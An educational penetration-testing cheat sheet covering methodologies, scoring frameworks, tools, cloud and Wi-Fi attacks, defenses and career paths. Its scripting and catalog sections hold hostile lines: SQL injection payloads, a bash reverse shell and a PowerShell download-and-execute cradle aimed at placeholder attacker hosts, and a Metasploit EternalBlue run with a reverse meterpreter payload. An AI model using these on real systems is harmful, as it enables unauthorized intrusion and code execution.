# The Ethical Hacker's Cheat Sheet

> *"Know your enemy and know yourself; in a hundred battles you will never be in peril."* —Sun Tzu
>
> Pen testing is structured curiosity with permission. You are a locksmith hired to break in; not to steal, but to write a report telling the owner which locks failed and how to fix them.

This isa comprehensive reference for offensive security, ethical hacking, and the path to becoming a professional pen tester.

---

## Table of Contents

1. [The Art of Ethical Hacking](#the-art-of-ethical-hacking)
2. [Core Concepts](#core-concepts)
3. [Acronyms Glossary](#acronyms-glossary)
4. [Methodologies](#methodologies)
5. [Vulnerability Scoring Frameworks](#vulnerability-scoring-frameworks)
6. [OWASP Top 10](#owasp-top-10)
7. [MITRE ATT&CK & NIST](#mitre-attck--nist)
8. [Full-Stack Offensive Testing](#full-stack-offensive-testing)
9. [Common Attacks Catalog](#common-attacks-catalog)
10. [Tooling Reference](#tooling-reference)
11. [Linux Distros for Hackers](#linux-distros-for-hackers)
12. [Scripting Survival Kit](#scripting-survival-kit)
13. [Cryptography Overview](#cryptography-overview)
14. [Wi-Fi Security Testing](#wi-fi-security-testing)
15. [Cloud Security (AWS, Azure, GCP)](#cloud-security)
16. [Adversary Emulation](#adversary-emulation)
17. [Post-Exploitation](#post-exploitation)
18. [Zero-Days & Deep Security Research](#zero-days--deep-security-research)
19. [Emerging Threats & TTPs](#emerging-threats--ttps)
20. [Defense-in-Depth & Defensive Techniques](#defense-in-depth)
21. [Social Engineering: Offense & Defense](#social-engineering)
22. [Common Misconfigurations & Crypto Flaws](#common-misconfigurations)
23. [Career Roadmap](#career-roadmap)
24. [Certification Stack](#certification-stack)
25. [Bug Bounty Programs](#bug-bounty-programs)
26. [Learning Resources](#learning-resources)
27. [Things People Forget](#things-people-forget)

---

## The Art of Ethical Hacking

The art lies in three habits:

- **Curiosity over compliance.** Don't just run the scanner, ask "what would *I* try if I were paid to be malicious?" Tools find the obvious; humans find what's interesting.
- **Methodology over magic.** Every successful engagement is 80% reconnaissance and 20% exploitation. The Hollywood "type fast, hack mainframe" image is fiction. Real work is patient enumeration.
- **Documentation over ego.** A vuln you can't reproduce in writing is a vuln that doesn't exist to the client. Reports are the deliverable; the shell is the byproduct.

**The mindset rule:** *Always have written authorization before you touch anything.* The line between "security researcher" and "felony defendant" is a signed Statement of Work.

---

## Core Concepts

### The CIA Triad

Think of the CIA triad as the three legs of a stool. Knock any leg out and the whole thing falls over.

| Pillar | What it means | Broken when... |
|---|---|---|
| **Confidentiality** | Only authorized eyes see the data | Data leaks, weak access control, unencrypted storage |
| **Integrity** | Data hasn't been tampered with | MITM, SQLi modifying records, supply-chain poisoning |
| **Availability** | The system is up when needed | DDoS, ransomware, misconfiguration, hardware failure |

### The DAD Triad (the evil twin)

Disclosure, Alteration, Destruction — what attackers cause when CIA fails.

### AAA (Authentication, Authorization, Accounting)

- **Authentication** — *Who are you?* (password, key, biometric)
- **Authorization** — *What are you allowed to do?* (RBAC, ACLs)
- **Accounting** — *What did you actually do?* (logs, audit trails)

**Metaphor:** Authentication is your ID at the bar door. Authorization is the wristband telling the bartender what you can order. Accounting is the security camera recording the whole night.

### Other foundational ideas

- **Least Privilege** — give every account the minimum it needs. The intern doesn't need root.
- **Defense in Depth** — onion layers, not a moat. If one fails, the next stops them.
- **Zero Trust** — "never trust, always verify." Don't assume the internal network is safe.
- **Threat Model** — STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege).

---

## Acronyms Glossary

| Acronym | Meaning |
|---|---|
| APT | Advanced Persistent Threat |
| C2 / CnC | Command and Control |
| CVE | Common Vulnerabilities and Exposures |
| CVSS | Common Vulnerability Scoring System |
| CWE | Common Weakness Enumeration |
| DFIR | Digital Forensics and Incident Response |
| EDR | Endpoint Detection and Response |
| IAM | Identity and Access Management |
| IDS / IPS | Intrusion Detection / Prevention System |
| IOC | Indicator of Compromise |
| LFI / RFI | Local / Remote File Inclusion |
| LOLBAS / LOLBins | Living Off the Land Binaries (built-in tools attackers abuse) |
| MFA / 2FA | Multi-Factor / Two-Factor Authentication |
| MITM | Man-in-the-Middle |
| OPSEC | Operational Security |
| OSINT | Open Source Intelligence |
| OWASP | Open Worldwide Application Security Project |
| PII | Personally Identifiable Information |
| PoC | Proof of Concept |
| PtH / PtT | Pass-the-Hash / Pass-the-Ticket |
| RCE | Remote Code Execution |
| RFC | Request for Comments |
| RoE | Rules of Engagement |
| SAST / DAST | Static / Dynamic Application Security Testing |
| SIEM | Security Information and Event Management |
| SOAR | Security Orchestration, Automation, Response |
| SOC | Security Operations Center |
| SSRF | Server-Side Request Forgery |
| TTP | Tactics, Techniques, and Procedures |
| WAF | Web Application Firewall |
| XSS | Cross-Site Scripting |
| XXE | XML External Entity |

---

## Methodologies

A methodology is a recipe. Without one, you're just freestyling — and you'll forget the eggs.

### PTES (Penetration Testing Execution Standard)

Seven phases, in order:

1. **Pre-engagement Interactions** — scope, RoE, contracts, legal sign-off
2. **Intelligence Gathering** — OSINT, recon, footprinting
3. **Threat Modeling** — what's worth attacking and why
4. **Vulnerability Analysis** — scan, validate, prioritize
5. **Exploitation** — actual offensive action
6. **Post-Exploitation** — pivoting, escalation, data access proof
7. **Reporting** — the deliverable

Reference: [pentest-standard.org](http://www.pentest-standard.org)

### OSSTMM (Open Source Security Testing Methodology Manual)

*(You wrote "DSTMM" — almost certainly OSSTMM.)* A scientific, metrics-driven approach from ISECOM. Heavier on quantitative results than PTES.

### OWASP Testing Guide (WSTG)

The bible for **web app** testing. Walks through every input vector and class of bug.

### NIST SP 800-115

US government's official technical guide to information security testing. Conservative, thorough, government-friendly.

### OSSTMM vs PTES vs OWASP — quick analogy

PTES is the *general* battle plan. OWASP WSTG is the web-app *playbook*. OSSTMM is the *scientific paper*. NIST is the *regulation manual*. Use whichever the client recognizes.

### Cyber Kill Chain (Lockheed Martin)

Recon → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives.

### Unified Kill Chain

An 18-step modern update combining Kill Chain + MITRE ATT&CK.

---

## Vulnerability Scoring Frameworks

### CVSS (Common Vulnerability Scoring System)

The "weather forecast" of vulns. Currently CVSSv4. Three metric groups:

- **Base** — intrinsic properties (Attack Vector, Complexity, Privileges, User Interaction, Impact on CIA)
- **Temporal** — changes over time (exploit maturity, patch availability)
- **Environmental** — your specific deployment context

Score 0.0–10.0, mapped to None / Low / Medium / High / Critical.

### DREAD (Microsoft, mostly historical)

| Letter | Question |
|---|---|
| **D**amage | How bad is the blast radius? |
| **R**eproducibility | How reliably does it work? |
| **E**xploitability | How hard is it to pull off? |
| **A**ffected users | How many people get hit? |
| **D**iscoverability | How easy is it to find? |

Each rated 1–10, averaged. Critiqued as subjective; many orgs have moved on, but you'll still see it.

### Other scoring you should know

- **EPSS** (Exploit Prediction Scoring System) — probability a CVE will be exploited in the wild in 30 days
- **SSVC** (Stakeholder-Specific Vulnerability Categorization) — CMU/CISA decision-tree alternative
- **OWASP Risk Rating Methodology** — Likelihood × Impact

---

## OWASP Top 10

The "ten plagues" of web app security. Updated periodically — the 2021 list (current as of writing):

1. **A01: Broken Access Control** — users doing things they shouldn't (IDOR, path traversal)
2. **A02: Cryptographic Failures** — weak/missing encryption, plaintext secrets
3. **A03: Injection** — SQLi, command injection, NoSQLi, LDAP injection
4. **A04: Insecure Design** — flaws baked in at the architecture stage
5. **A05: Security Misconfiguration** — default creds, verbose errors, open S3 buckets
6. **A06: Vulnerable & Outdated Components** — unpatched libraries (Log4Shell, etc.)
7. **A07: Identification & Authentication Failures** — weak passwords, broken session mgmt
8. **A08: Software & Data Integrity Failures** — unsigned updates, supply-chain attacks
9. **A09: Security Logging & Monitoring Failures** — you can't respond to what you don't see
10. **A10: Server-Side Request Forgery (SSRF)** — making the server fetch URLs an attacker chose

### Sister lists worth knowing

- **OWASP API Security Top 10** — different from web (BOLA, broken auth, mass assignment)
- **OWASP Mobile Top 10** — improper platform use, insecure storage, etc.
- **OWASP LLM Top 10** — prompt injection, training data poisoning (this is the new frontier)

---

## MITRE ATT&CK & NIST

### MITRE ATT&CK

Think of it as the *Dewey Decimal System for attacker behavior*. Tactics are the "why" (columns), Techniques are the "how" (rows).

**14 Tactics (Enterprise):**
Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Command and Control → Exfiltration → Impact

Each technique has an ID like `T1059` (Command and Scripting Interpreter). Use ATT&CK Navigator to map your engagements.

Sub-frameworks: **MITRE D3FEND** (defenders), **CAR** (Cyber Analytics Repository), **ATT&CK for ICS / Mobile / Cloud**.

### NIST Frameworks

- **NIST CSF 2.0** (Cybersecurity Framework) — Identify, Protect, Detect, Respond, Recover, **Govern** (added in 2.0)
- **NIST SP 800-53** — security & privacy controls catalog (federal)
- **NIST SP 800-171** — controls for non-federal systems handling CUI
- **NIST SP 800-115** — technical guide to security testing
- **NIST SP 800-61** — incident response handling
- **NIST SP 800-30** — risk assessment

---

## Full-Stack Offensive Testing

### Network Pen Testing

Goal: find the path from "outside" or "low-priv user" to "domain admin / sensitive data".

**Workflow:**
- Recon: passive (Shodan, Censys, certificate transparency) → active (nmap, masscan)
- Enumeration: SMB (`enum4linux`, `smbclient`), SNMP (`onesixtyone`, `snmpwalk`), LDAP (`ldapsearch`)
- Vulnerability scanning: Nessus, OpenVAS, Nuclei
- Exploitation: Metasploit, manual PoCs
- AD attacks: Kerberoasting, AS-REP roasting, BloodHound, Rubeus, Mimikatz, NTLM relay (ntlmrelayx, Responder)

### Web Application Testing

- Map the app (spider with Burp, ffuf for hidden endpoints)
- Test every input: cookies, headers, params, JSON fields, file uploads
- Auth: session fixation, JWT none-alg, IDOR, privilege escalation
- Reference: OWASP WSTG, PortSwigger Web Security Academy

### API Testing

APIs are like vending machines — the documented buttons are fine, but try pressing the buttons you weren't supposed to know about.

- Tools: Postman, Burp, **Kiterunner** (for hidden endpoints)
- Watch for: BOLA (Broken Object Level Auth), mass assignment, excessive data exposure, rate limiting bypass, GraphQL introspection abuse

### Mobile Testing

- **Android:** APKtool, jadx, Frida, Objection, MobSF, Drozer
- **iOS:** Frida, Objection, MobSF, Hopper / Ghidra, jailbroken device or corellium
- Watch for: insecure storage (SharedPreferences, Keychain misuse), cert pinning bypass, deep link abuse, exported components

### IoT Testing

- **Hardware:** UART/JTAG, SPI flash dumping (Bus Pirate, Shikra, FlashCat), logic analyzer
- **Firmware:** binwalk, firmware-mod-kit, Ghidra, IDA
- **Wireless:** BLE (gatttool, Bettercap), Zigbee (KillerBee), LoRa, RF (HackRF, RTL-SDR)
- **OWASP IoT Top 10** is your friend

### Social Engineering (Human Layer)

Covered in its [own section](#social-engineering) below — phishing kits (GoPhish, Evilginx), pretexting, vishing, OSINT-driven targeting.

---

## Common Attacks Catalog

### SQL Injection

The classic. Untrusted input concatenated into a SQL query. Use **parameterized queries / prepared statements** to defend.

```sql
-- Classic
' OR '1'='1' --
-- Union-based extraction
' UNION SELECT username, password FROM users --
-- Blind / time-based
' AND SLEEP(5) --
```

Tool: **sqlmap** (`sqlmap -u "http://target/page?id=1" --dbs`).

### XSS (Cross-Site Scripting)

Inject JavaScript that runs in another user's browser.

- **Reflected** — payload in URL, executes on response
- **Stored** — saved in DB, runs for everyone who views (forum, comments)
- **DOM** — payload manipulates DOM client-side without server roundtrip

Defense: context-aware output encoding, CSP headers, framework auto-escaping.

### Man-in-the-Middle (MITM)

Attacker silently sits between two parties. Done via ARP spoofing on LAN, rogue Wi-Fi APs (Evil Twin), DNS hijacking, or BGP attacks at scale. Defense: TLS everywhere with proper cert validation, HSTS, certificate pinning.

### DNS Cache Poisoning

Inject a forged DNS response so victims resolve `bank.com` to your IP. Mitigations: DNSSEC, randomized source ports (Kaminsky fix), DoH/DoT.

### Password Attacks

- **Brute force** — try every combination
- **Dictionary / wordlist** — try likely candidates (rockyou.txt)
- **Credential stuffing** — reuse breached creds elsewhere
- **Spraying** — one common password against many accounts (avoids lockouts)
- **Rainbow tables** — precomputed hash lookups (defeated by salting)
- Tools: **Hashcat**, **John the Ripper**, **Hydra**, **Medusa**

### Other essential attacks

- **CSRF** — trick a logged-in user's browser into making a request
- **SSRF** — make the server make requests on your behalf (cloud metadata = `169.254.169.254`)
- **XXE** — XML parser fetches remote/local resources
- **Deserialization** — controlled object data → RCE (Java, .NET, PHP)
- **Race Conditions / TOCTOU** — exploit time-gap between check and use
- **Buffer Overflow** — write past memory boundaries (stack/heap)
- **DoS / DDoS** — exhaust resources (volumetric, protocol, application-layer)

---

## Tooling Reference

### Burp Suite (PortSwigger)

The Swiss Army knife of web testing. Intercepting proxy + scanner + repeater + intruder.

- **Proxy** — pause and modify requests
- **Repeater** — replay with tweaks
- **Intruder** — fuzz parameters
- **Scanner** (Pro) — automated bug hunting
- **Extender / BApp Store** — add modules
- Learn: [PortSwigger Web Security Academy](https://portswigger.net/web-security) (free, exceptional)

### Nmap

The radar of network testing.

```bash
nmap -sC -sV -oA scan target            # default scripts + version, all output formats
nmap -p- --min-rate 5000 target         # all ports, fast
nmap -sU --top-ports 100 target         # UDP top 100
nmap --script vuln target               # NSE vuln scripts
nmap -sS -T4 -A -v target               # stealthy SYN, aggressive
```

Learn: [nmap.org/book](https://nmap.org/book/), Nmap Network Scanning by Fyodor.

### Nessus (Tenable)

Industry-standard vulnerability scanner. Comparable: OpenVAS (free), Qualys, Rapid7 InsightVM. Great at coverage, weak at validation — *always* manually verify findings.

### Metasploit

The exploitation framework — like an arsenal with thousands of pre-loaded weapons.

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
exploit
```

Learn: Offensive Security's Metasploit Unleashed (free), HackTricks.

### Wireshark

The microscope of network traffic. Capture (on a SPAN port or via `tcpdump`), then dissect protocol-by-protocol. Filters are the magic:

```
tcp.port == 80
http.request.method == "POST"
ip.src == 10.0.0.5 and tcp.flags.syn == 1
```

### sqlmap

Automated SQL injection. Powerful enough that you must be careful with `--risk` and `--level` flags on production systems.

### Cobalt Strike / Mythic / Sliver (C2 Frameworks)

Command-and-control platforms used by red teams (and adversaries — that's the point of emulation).

- **Cobalt Strike** — commercial, gold standard, heavy fingerprint
- **Mythic** — open-source, modular agents (Apollo, Athena, etc.)
- **Sliver** — Bishop Fox, open-source, gaining popularity
- **Empire / Starkiller, Havoc, Brute Ratel** — others in the space

You'll learn these on red team engagements; misuse is illegal.

### Fortify on Demand (OpenText, formerly Micro Focus / HP)

Cloud-based SAST/DAST/MAST scanner used in enterprise SDLC pipelines. Common in Fortune 500 environments. Comparable: Veracode, Checkmarx, Snyk, SonarQube, Semgrep.

### Other essentials

| Tool | Purpose |
|---|---|
| **ffuf / gobuster / feroxbuster** | Web content discovery |
| **Hashcat / John** | Password cracking |
| **BloodHound / SharpHound** | Active Directory attack-path mapping |
| **Mimikatz / Rubeus** | Windows credential extraction & Kerberos abuse |
| **Impacket suite** | Python AD/network tooling (`secretsdump`, `psexec`, `wmiexec`, `ntlmrelayx`) |
| **Responder** | LLMNR/NBT-NS poisoning |
| **CrackMapExec / NetExec** | Swiss-army for AD networks |
| **Nuclei** | Template-based fast vuln scanner |
| **Aircrack-ng / Bettercap** | Wireless / MITM |
| **Ghidra / IDA / radare2** | Reverse engineering |
| **Volatility** | Memory forensics |
| **Frida** | Dynamic instrumentation (mobile, desktop) |

---

## Linux Distros for Hackers

| Distro | Vibe |
|---|---|
| **Kali Linux** | The default. Offensive Security's distro. Pre-loaded toolset. |
| **Parrot Security OS** | Lighter, privacy-focused alternative. |
| **BlackArch** | Arch-based, *huge* tool repo (2,800+). |
| **Tails** | Amnesic, Tor-routed — for OPSEC, not pen testing |
| **REMnux** | Malware analysis & reverse engineering |
| **CSI Linux** | Forensics & investigations |
| **Commando VM** | Windows offensive distro (Mandiant) |
| **Flare-VM** | Windows malware analysis (Mandiant) |

**Pro tip:** Don't run Kali as your daily driver. Use it in a VM (VMware, VirtualBox, UTM) or on a separate machine. Snapshot before engagements.

---

## Scripting Survival Kit

If pen testing is cooking, scripting is sharpening your knives. Slow without it.

### Bash (Linux/macOS quick wins)

```bash
# One-liner port scan
for p in {1..1000}; do (echo > /dev/tcp/$IP/$p) 2>/dev/null && echo "Open: $p"; done

# Reverse shell
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Mass curl with jq
for u in $(cat urls.txt); do curl -s "$u" | jq '.token'; done
```

### PowerShell (Windows native, deeply privileged)

```powershell
# Download & execute (Cradle — flagged by EDR)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# AMSI bypass research, AD recon (PowerView, ADModule)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

Learning: PowerShell for Pentesters, Harmj0y's blog, ATT&CK technique T1059.001.

### Python (the universal solvent)

```python
import requests
r = requests.get("http://target/api/v1/users", headers={"Authorization": f"Bearer {token}"})
print(r.json())
```

Libraries to know: `requests`, `scapy`, `pwntools`, `impacket`, `paramiko`, `pycryptodome`, `beautifulsoup4`.

**Bonus languages worth touching:** Go (modern offensive tools — Sliver, ffuf, Nuclei), C/C++ (shellcoding, malware dev), Rust (modern offensive dev), JavaScript (XSS, browser exploits).

---

## Cryptography Overview

Cryptography is the math behind trust. You don't need to be a cryptographer, but you must recognize broken crypto on sight.

### The big buckets

- **Symmetric** — same key both sides (AES, ChaCha20). Fast. Key distribution is the hard problem.
- **Asymmetric** — public/private keypair (RSA, ECC, Ed25519). Slow. Solves key exchange.
- **Hashing** — one-way (SHA-256, SHA-3, BLAKE2). For integrity, not encryption.
- **Password hashing** — *deliberately slow* (Argon2, bcrypt, scrypt, PBKDF2). Different from generic hashing.
- **MAC / HMAC** — authenticated integrity tag.
- **Authenticated encryption (AEAD)** — combines confidentiality + integrity (AES-GCM, ChaCha20-Poly1305). Use this.

### Common encryption flaws (red flags)

- **ECB mode** — patterns visible (the famous "ECB Penguin")
- **No IV / reused IV** — breaks CBC, GCM
- **Custom crypto** — *Don't roll your own* is the first rule
- **Hard-coded keys** in source / config
- **MD5 / SHA-1** for anything new
- **Weak RNGs** (`rand()` for crypto = catastrophic)
- **Padding oracles** (CBC) — POODLE, BEAST
- **Downgrade attacks** — forcing TLS 1.0
- **Length-extension** vulns (use HMAC, not raw H(key||data))

### SSL/TLS (yes, you wrote "TES" — it's TLS)

- TLS 1.2 acceptable, **TLS 1.3 preferred**, SSL/TLS 1.0/1.1 deprecated
- Tools: **testssl.sh**, **sslyze**, **Qualys SSL Labs**, **nmap --script ssl-enum-ciphers**
- Watch for: weak ciphers (RC4, 3DES), expired certs, self-signed in prod, missing HSTS

### Post-Quantum Crypto (PQC) — the horizon

NIST has standardized **CRYSTALS-Kyber** (KEM), **CRYSTALS-Dilithium** (signatures), **SPHINCS+**, **FALCON**. "Harvest now, decrypt later" is a real threat model — adversaries are storing encrypted traffic today to break with future quantum computers.

---

## Wi-Fi Security Testing

Wireless is where the network meets the air — and air is hard to fence.

### Protocol generations

- **WEP** — broken since 2001. If you find it, you're done.
- **WPA / WPA2** — PSK or Enterprise (802.1X)
- **WPA3** — SAE handshake, defeats offline cracking (mostly)

### Attack classics

- **Handshake capture + offline crack** — Aircrack-ng, hcxdumptool → hashcat (`-m 22000`)
- **PMKID attack** — no client needed (hcxdumptool)
- **Evil Twin** — clone SSID, harvest creds (Airgeddon, WiFi Pumpkin, Eaphammer)
- **WPS PIN** — Reaver, Bully (mostly patched, sometimes works)
- **Karma** — exploit probe-request leaks
- **Deauth** — force client reconnect to capture handshake

### Hardware

Get a card with monitor mode + injection: **Alfa AWUS036ACS / NHA**, **Panda PAU09**. USB Wi-Fi adapters with appropriate chipsets (Atheros, Realtek RTL8812AU, MediaTek MT7612U).

---

## Cloud Security

The cloud isn't "someone else's computer" — it's "someone else's *misconfigured* computer."

### Shared Responsibility (memorize this)

The cloud provider secures the cloud (hardware, hypervisor). **You** secure what's *in* the cloud (configs, data, IAM). Most breaches are customer misconfigurations, not provider failures.

### AWS

- **IAM** — the keys to the kingdom. Look for over-permissive policies, wildcard `*` actions/resources, privilege escalation paths.
- **S3** — public buckets, missing encryption, no logging
- **EC2 metadata service (IMDSv1)** — SSRF target. IMDSv2 with hop-limit is required.
- Tools: **Pacu**, **ScoutSuite**, **Prowler**, **CloudSploit**, **CloudGoat** (lab), **AWS-vault**
- Reference: [HackTricks Cloud](https://cloud.hacktricks.wiki/), [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)

### Azure

- **Azure AD / Entra ID** — Conditional Access bypass, illicit consent grants, MFA fatigue
- **Service principals** with too much scope
- Tools: **ROADtools**, **AzureHound**, **MicroBurst**, **PowerZure**, **Stormspotter**

### GCP

- **IAM impersonation chains** — service account hopping
- **Metadata server abuse**
- Tools: **GCPBucketBrute**, **gcp_scanner**, **HayStack**, **gcp_enum**

### Cross-cloud frameworks

- **MITRE ATT&CK for Cloud**
- **CIS Benchmarks** (per provider)
- **Cloud Security Alliance CCM**

---

## Adversary Emulation

Pen test = "find as many bugs as possible." Red team / adversary emulation = "*behave like a real APT* and see if defenders catch you."

### Frameworks

- **MITRE Caldera** — automated adversary emulation
- **Atomic Red Team** — single-technique tests mapped to ATT&CK
- **Stratus Red Team** — cloud-focused (AWS, GCP, Kubernetes)
- **Vectr** — purple-team campaign tracking
- **Prelude Operator**

### Process (for network/app/cloud)

1. Pick a threat actor relevant to the client (FIN7, APT29, etc.)
2. Pull their TTPs from MITRE ATT&CK groups & Threat Intel reports
3. Build playbook: Initial Access → Execution → … → Impact
4. Execute with stealth; coordinate with Blue Team (white-card or true black-box)
5. Score detection coverage; gaps become defensive roadmap items

### Purple Teaming

Red and Blue working together — like a pilot and air-traffic controller in the same room. Faster feedback loop, shared dashboards (Vectr), explicit detection engineering.

---

## Post-Exploitation

You have a shell. Now what? Goal: prove impact, gather proof for the report — *don't* damage the client.

### Standard workflow

1. **Situational awareness** — `whoami /all`, `id`, `hostname`, `ipconfig /all`
2. **Privilege escalation** — winPEAS / linPEAS / PowerUp
3. **Persistence** — only with explicit RoE permission (registry run keys, scheduled tasks, services, cron, systemd, WMI subscriptions)
4. **Credential access** — Mimikatz, LSASS dumping, SAM/SYSTEM hives, browser-stored creds
5. **Lateral movement** — Pass-the-Hash (`smbexec`, `wmiexec`), RDP, SSH key reuse, Kerberos abuse
6. **Discovery** — file shares, password files (`cpassword` in GPP, anyone?), .env, kdbx
7. **Exfiltration sim** — over DNS, HTTPS, SMB; canary file proves data egress is possible
8. **Cleanup** — remove implants, document everything

**Living off the land:** prefer built-in tools (LOLBAS / GTFOBins) — they evade detection and demonstrate that "no malware needed."

---

## Zero-Days & Deep Security Research

Zero-day = unpatched vuln unknown to vendor. Finding one is a *long* process.

### Skills required

- Reverse engineering (Ghidra / IDA / Binary Ninja)
- Code review (manual + Semgrep / CodeQL)
- Fuzzing (AFL++, libFuzzer, Honggfuzz, Jazzer, Boofuzz)
- Exploit development (heap shaping, ROP, kernel internals)
- Reading patches (n-day → 1-day pipeline)
- Familiarity with target's architecture (browser, kernel, hypervisor)

### Where research happens

- Pwn2Own / Zero Day Initiative
- Bug bounties (Google VRP, Apple SRD, Microsoft, ZDI)
- Academic papers (USENIX, IEEE S&P, BlackHat, DEFCON)
- Vendor advisories — read every patch
- Project Zero blog (Google) — gold standard write-ups

### Mindset

Zero-day research is a marathon. Pick a target, read its code, understand it deeper than its developers. The bug is found by the person who reads the most.

---

## Emerging Threats & TTPs

The threat landscape (as of writing — verify currency):

- **AI-assisted attacks** — LLM-driven phishing, deepfake vishing, automated recon
- **Prompt injection / LLM exploitation** — OWASP LLM Top 10
- **Supply chain attacks** — SolarWinds, MOVEit, XZ Utils backdoor (CVE-2024-3094)
- **Ransomware-as-a-Service (RaaS)** — affiliates + operators
- **Living off the Land (LOLBins)** — bypass EDR with built-in tools
- **Cloud-native attacks** — IMDS abuse, K8s escapes, container breakouts
- **Identity-centric attacks** — token theft, OAuth phishing, MFA fatigue/bombing
- **Edge device exploitation** — VPN appliances, firewalls (Pulse, FortiGate, Ivanti)
- **Operational Technology (OT/ICS)** — Stuxnet's descendants
- **Mobile device exploitation** — NSO Pegasus-class chains
- **Cryptojacking, business email compromise (BEC)** — high-volume, low-tech, profitable

### Threat intel sources

- **CISA Alerts**, **MITRE ATT&CK Groups**, **Mandiant M-Trends**, **CrowdStrike Global Threat Report**, **Verizon DBIR**, **Microsoft Digital Defense Report**, **Recorded Future**

---

## Defense-in-Depth

Every defense fails *eventually*. The strategy is to make sure the *next* one catches what the previous one missed.

### Layered controls

| Layer | Examples |
|---|---|
| **Perimeter** | Firewalls (next-gen, stateful), WAFs, DDoS mitigation (Cloudflare, Akamai) |
| **Network** | Segmentation, VLANs, IDS/IPS (Snort, Suricata, Zeek), NDR |
| **Endpoint** | EDR (CrowdStrike, SentinelOne, Defender ATP), antivirus (Defender, Malwarebytes), application allowlisting |
| **Identity** | MFA, conditional access, PAM (CyberArk, BeyondTrust), JIT/JEA |
| **Application** | WAF, RASP, SAST/DAST, secure SDLC |
| **Data** | Encryption at rest/in transit, DLP, tokenization |
| **People** | Training, phishing sims, security culture |
| **Detection & Response** | SIEM (Splunk, Sentinel, Elastic), SOAR, threat hunting, IR plan |

### The OODA Loop (defenders' decision rhythm)

Observe → Orient → Decide → Act. Faster than the attacker = you win.

### Detection engineering

Write Sigma / Splunk / KQL detection rules tied to MITRE ATT&CK. Reference: SigmaHQ on GitHub, Elastic Detection Rules.

---

## Social Engineering

Humans are the most patched-resistant operating system.

### Offensive techniques

- **Phishing** — email lures (GoPhish, Evilginx2 for MFA-capable AitM, Modlishka)
- **Vishing** — voice (asterisk, voice cloning today)
- **Smishing** — SMS
- **Pretexting** — built persona
- **Baiting** — USB drops, free tools with malware
- **Quid pro quo** — "I'm IT, just need your password to fix this"
- **Tailgating / piggybacking** — physical entry behind authorized person

### OSINT for SE

theHarvester, Maltego, Recon-ng, SpiderFoot, OSINT Framework, Hunter.io, LinkedIn, Sherlock (username enumeration), Pipl, Have I Been Pwned, Wayback Machine, Shodan, Google dorks (GHDB).

### Defense

- Security awareness training (KnowBe4, Hoxhunt, ESET) — but training alone doesn't work
- Phishing-resistant MFA (FIDO2 / WebAuthn / passkeys)
- DMARC + SPF + DKIM (email auth)
- Email gateway sandboxing (Proofpoint, Mimecast)
- Reporting culture — "report suspicious" button is gold
- Verified callbacks for sensitive requests (no money moves on email alone)

---

## Common Misconfigurations

The "I left the keys under the welcome mat" category — and it's the #1 way breaches happen.

- Default credentials (admin/admin, postgres/postgres)
- Open S3 / Azure blob / GCS buckets
- Verbose error pages exposing stack traces, framework versions
- Unrestricted file uploads
- CORS wildcards (`Access-Control-Allow-Origin: *` with credentials)
- Missing security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options, Referrer-Policy)
- Exposed `.git/`, `.env`, `.svn/`, backup files (`web.config.bak`, `db.sql`)
- Directory listing enabled
- Unrestricted RDP/SSH on the internet
- Anonymous SMB / FTP
- Snmp `public` community
- Open Elasticsearch/MongoDB/Redis (no auth)
- Internal services exposed via reverse proxy misconfig
- Kubernetes dashboard exposed without auth
- Cloud metadata service accessible from web app (SSRF → cloud creds)

---

## Career Roadmap

Getting hired without a CS degree is harder; with your master's, you're ahead. The bottleneck is *demonstrable* skill, not credentials.

### Stage 1 — Foundations (months 0–6)

- Networking: TCP/IP, DNS, HTTP(S), routing — read *The TCP/IP Guide* or take CompTIA Network+ material
- Linux command line fluency — *The Linux Command Line* (William Shotts), Linux Journey
- Windows internals & Active Directory basics — Microsoft Learn
- One scripting language fluently (Python is the easiest answer)
- Set up a home lab (VirtualBox/VMware, Kali + vulnerable VMs)

### Stage 2 — Hands-on (months 6–12)

- **TryHackMe** — beginner-friendly guided rooms (Pre-Security → Cyber Security 101 → SOC Level 1 → Junior Penetration Tester paths)
- **HackTheBox Academy** + retired machines
- **PortSwigger Web Security Academy** — finish all the apprentice + practitioner labs
- **PicoCTF**, **OverTheWire (Bandit, Natas, Leviathan)** — gamified intro
- Document everything in a public blog or GitHub. Hiring managers love write-ups.

### Stage 3 — Cert + Cred (months 12–24)

- **CompTIA Security+** — HR filter; nearly required for cleared / DoD jobs
- **eJPT** (INE) — practical, beginner-friendly cert
- **PNPT** (TCM Security) — practical AD pen test cert with report deliverable
- **OSCP** (Offensive Security) — the *industry milestone* for offensive roles. Hard. 24-hour exam + 24-hour report.
- Apply broadly: junior pen tester, security analyst, SOC analyst (great pivot to red later)

### Stage 4 — Specialize (years 2+)

Pick a lane: web/app, AD/network, cloud (AWS/Azure/GCP), mobile, red team, malware dev, exploit dev, ICS/OT, automotive, IoT, hardware. Then go *deep*. Specialists outearn generalists.

### Skills hiring managers actually look for

- Can you write a clean report? (Practice on HTB write-ups)
- Can you *explain* a vuln to a developer without making them defensive?
- Do you understand how the bug works, or just how to run the tool?
- Can you script your way out of repetitive tasks?
- Do you have a portfolio? GitHub > certificate, sometimes.

---

## Certification Stack

A rough "cert ladder" — you don't need them all, but employers ask about them.

### Entry-level

- **CompTIA Security+** — HR-friendly, baseline
- **CompTIA Network+** — networking foundation
- **CompTIA CySA+** — defensive analyst
- **eJPT** (INE) — practical pen test entry
- **PNPT** (TCM) — practical pen test, includes report
- **CEH** (EC-Council) — *recognized but widely critiqued*; useful for HR keyword filters

### Mid-level (offensive)

- **OSCP** (Offensive Security) — the gold standard
- **CRTP / CRTE** (Altered Security) — Active Directory-focused
- **CRTO** (Zero-Point Security) — red team ops, Cobalt Strike
- **PNPT → OSCP → OSWA / OSWE** progression
- **GPEN, GWAPT, GXPN** (SANS / GIAC) — expensive, prestigious, training included
- **OSWE** — web exploitation
- **OSEP** — evasion + AD
